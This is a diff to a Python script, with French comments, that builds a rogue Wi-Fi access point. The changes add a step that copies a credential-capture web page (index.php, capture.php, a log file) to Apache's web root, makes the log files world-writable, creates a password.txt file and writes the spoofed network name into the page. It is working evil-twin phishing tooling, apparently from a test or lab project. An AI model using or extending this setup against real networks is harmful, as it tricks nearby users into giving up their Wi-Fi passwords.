@@ -84,19 +84,29 @@ def start_dnsmasq():
         print("[SUCCESS] : Service Dnsmasq démarré avec succès.")
 
 
-# Lancer le serveur HTTP Python
-def start_http_server():
-    # Partie 1 : Copie du Site
+#  Copie des fichiers du site web
+def copy_webserver_files():
     print("[INFO] : Copie des fichiers du site web...")
-    os.system("sudo cp src/rogue_ap/WebsiteRogue/index.html /var/www/html/")
+    # os.system("sudo cp src/rogue_ap/WebsiteRogue/index.html /var/www/html/")
+    os.system("sudo cp src/rogue_ap/WebsiteRogue/index.php /var/www/html/")
     os.system("sudo cp src/rogue_ap/WebsiteRogue/capture.php /var/www/html/")
     os.system("sudo cp src/rogue_ap/WebsiteRogue/log.txt /var/www/html/")
+    os.system("sudo cp src/rogue_ap/WebsiteRogue/essid.txt /var/www/html/")
     
-    os.system("sudo chmod 644 /var/www/html/index.html")
+    # os.system("sudo chmod 644 /var/www/html/index.html")
+    os.system("sudo chmod 644 /var/www/html/index.php")
     os.system("sudo chmod 666 /var/www/html/capture.php")
     os.system("sudo chmod 666 /var/www/html/log.txt")
+    os.system("sudo chmod 666 /var/www/html/essid.txt")
     
-    # Partie 2 : Redémarrage du Service
+    # Création du fichier password.txt
+    with open("password.txt", "w") as password_file:
+        password_file.write("")
+    print("[SUCCESS] : Fichier password.txt créé avec succès.")
+
+
+# Lancer le serveur HTTP Python
+def start_http_server():
     os.system("sudo systemctl restart apache2.service")
     print("[SUCCESS] : Serveur HTTP démarré avec succès.")
 
@@ -135,6 +145,12 @@ def setup_rogue_ap(interface, channel, essid):
     create_dnsmasq_conf(interface)
     iptables_conf(interface)
     launch_interface(interface)
+    copy_webserver_files()
+    
+    # Écrit l'ESSID
+    with open("/var/www/html/essid.txt", "w") as f:
+        f.write(essid)
+    
     start_http_server()
     
     print("[INFO] : Configuration de l'adresse IP de l'AP...")
@@ -159,5 +175,5 @@ def setup_rogue_ap(interface, channel, essid):
 if __name__ == "__main__":
     interface = "wlan0"
     channel = "10"
-    essid = "Test"
+    essid = "MonWifideTest"
     setup_rogue_ap(interface, channel, essid)
